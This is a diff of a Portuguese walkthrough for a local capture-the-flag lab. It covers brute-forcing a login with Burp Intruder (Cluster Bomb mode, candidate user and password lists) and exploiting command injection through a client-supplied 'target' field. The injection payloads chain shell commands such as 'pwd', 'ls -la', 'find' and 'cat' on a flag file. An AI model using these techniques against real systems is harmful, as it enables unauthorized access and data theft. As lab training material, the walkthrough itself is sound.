@@ -58,22 +58,39 @@ Acesse a nota do backup:
 /backup/readme.txt
 ```
 
-Esse arquivo indica uma lista pequena de candidatos:
+Esse arquivo indica duas listas pequenas de candidatos:
 
 ```text
+user-candidates.txt
 password-candidates.txt
 ```
 
-Abra ou baixe a lista. Ela foi criada para validacao controlada dentro do lab local, com poucas senhas candidatas. Nao use wordlists grandes, ataques agressivos ou alvos fora do escopo.
+Abra ou baixe as listas. Elas foram criadas para validacao controlada dentro do lab local, com poucos usuarios e poucas senhas candidatas. Nao use wordlists grandes, ataques agressivos ou alvos fora do escopo.
 
-Use o Burp Intruder:
+Use o Burp Intruder com duas posicoes:
 
-1. Use o Proxy para capturar uma tentativa de login com `username` fixo como `analyst`.
+1. Use o Proxy para capturar uma tentativa de login.
 2. Envie o `POST /api/auth/login` para o Intruder.
-3. Marque somente o valor do campo `password` como posicao.
-4. Carregue as senhas candidatas da lista pequena.
-5. Inicie o ataque apenas contra o ambiente local.
-6. Compare status code, tamanho da resposta e mensagem.
+3. Marque o valor de `username` como primeira posicao.
+4. Marque o valor de `password` como segunda posicao.
+5. Use o tipo de ataque `Cluster Bomb`.
+6. Carregue `user-candidates.txt` como Payload set 1.
+7. Carregue `password-candidates.txt` como Payload set 2.
+8. Inicie o ataque apenas contra o ambiente local.
+9. Compare status code, tamanho da resposta e mensagem.
+
+O corpo fica conceitualmente assim:
+
+```json
+{
+  "username": "§user§",
+  "password": "§password§",
+  "client": "web",
+  "returnUrl": "/dashboard.html"
+}
+```
+
+Alternativa: se voce ja validou o usuario `analyst` nas notas de deployment, mantenha `username` fixo como `analyst` e use o Intruder apenas no campo `password`.
 
 A tentativa correta retorna `200` e a mensagem:
 
@@ -105,6 +122,8 @@ Abra DevTools Network ou configure o Burp Proxy e repita a verificacao. A chamad
 
 O detalhe central e que `target` nao e editavel na UI, mas e enviado pelo cliente.
 
+A falha nao pertence ao card Gateway Edge em si. Todos os cards usam a mesma funcionalidade de verificacao. O ponto vulneravel e o backend confiar no campo `target` enviado pelo cliente.
+
 ## 3. Request tampering
 
 Envie a requisicao para o Burp Repeater. Antes de tentar qualquer exploracao, altere campos com cuidado e mantenha a estrutura JSON valida.
@@ -121,7 +140,26 @@ No Repeater, altere `target` para um teste inofensivo:
 
 Se a resposta incluir a saida desse comando, voce confirmou execucao de comando com output visivel. Essa etapa nao deve retornar flag automaticamente; ela e apenas uma prova de impacto.
 
-Depois, use a propria falha para ler a primeira evidencia:
+Agora faca uma enumeracao basica e controlada do ambiente, sem comandos destrutivos. Primeiro entenda o diretorio atual:
+
+```text
+127.0.0.1; pwd
+```
+
+Liste arquivos e diretorios proximos:
+
+```text
+127.0.0.1; ls -la
+127.0.0.1; ls -la /app
+```
+
+Procure arquivos de interesse com profundidade limitada:
+
+```text
+127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null
+```
+
+Esse fluxo simula pos-exploracao basica e enumeracao de filesystem dentro do container local. Depois de identificar a evidencia, leia o arquivo encontrado:
 
 ```text
 127.0.0.1; cat /app/flags/flag1.txt
